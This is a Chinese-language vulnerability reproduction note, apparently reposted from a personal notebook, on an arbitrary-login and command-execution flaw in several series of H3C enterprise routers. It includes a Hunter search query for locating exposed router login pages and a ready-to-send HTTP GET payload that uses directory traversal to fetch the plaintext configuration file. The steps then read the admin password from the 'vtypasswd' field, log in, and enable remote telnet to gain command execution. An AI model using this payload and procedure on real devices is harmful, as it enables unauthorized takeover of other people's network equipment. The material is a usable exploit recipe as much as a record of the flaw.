# H3C多系列路由器存在任意用户登录漏洞

# 一、漏洞简介
 H3C 企业路由器(ERN ERG2N GR 系列》存在任意用户登录和命令 执行漏洞，攻击者可通过访问nserLog in.asp/actionpalicy_status1./xxxx.cfg 接口，xxxx为设备型号（比如设备型号为 ER5200G2 ，即访问userLog in.asp/../actionpolicy_status/../ER5200G2.cfg），统过COOKIE 验证，进行目录穿越，获取 设备的明文配置文件，配置中有明文的web 管理员账号admin 的密码，登陆后台 即可通过开启 telenet 获取命令执行权限  

# 二、影响版本
+ H3C多系列路由器

# 三、资产测绘
+ hunter`app.name="H3C Router Management"`
+ 登录页面

![1693536029401-fe49c297-e04b-42c4-8935-a0a3181716cd.png](./img/MqXw12ts-2hI9P3j/1693536029401-fe49c297-e04b-42c4-8935-a0a3181716cd-205034.png)

# 四、漏洞复现
1. 访问userLog in.asp/actionpalicy_status1./xxxx.cfg 接口，xxxx为设备型号（比如设备型号为 ER5200G2 ，即访问userLog in.asp/../actionpolicy_status/../ER5200G2.cfg）
2. 根据设备型号修改payload

```java
GET /userLogin.asp/../actionpolicy_status/../ER2200G2.cfg HTTP/1.1
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1693536147392-494bee2a-1d0a-4c59-b943-d9628a7a00ef.png](./img/MqXw12ts-2hI9P3j/1693536147392-494bee2a-1d0a-4c59-b943-d9628a7a00ef-397355.png)

3. <font style="color:rgba(0, 0, 0, 0.9);">密码就在</font>`<font style="color:rgba(0, 0, 0, 0.9);">vtypasswd</font>`<font style="color:rgba(0, 0, 0, 0.9);">字段</font>

![1693536224274-36454c0c-1465-42d4-bb2a-8898f177df6a.png](./img/MqXw12ts-2hI9P3j/1693536224274-36454c0c-1465-42d4-bb2a-8898f177df6a-471592.png)

4. 账户为`admin`

![1693536284723-c565c1e4-eb3c-434d-8d79-7a0cdb06204b.png](./img/MqXw12ts-2hI9P3j/1693536284723-c565c1e4-eb3c-434d-8d79-7a0cdb06204b-398196.png)

5. 可在`远程管理`->`远程telnet管理`处开启telnet获取命令执行权限

![1693536401401-e5557bea-3c29-49ca-bdf4-9f1b8e4d2cdf.png](./img/MqXw12ts-2hI9P3j/1693536401401-e5557bea-3c29-49ca-bdf4-9f1b8e4d2cdf-114600.png)



> 更新: 2024-02-29 23:57:19  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wgzkiefvdexpuyq1>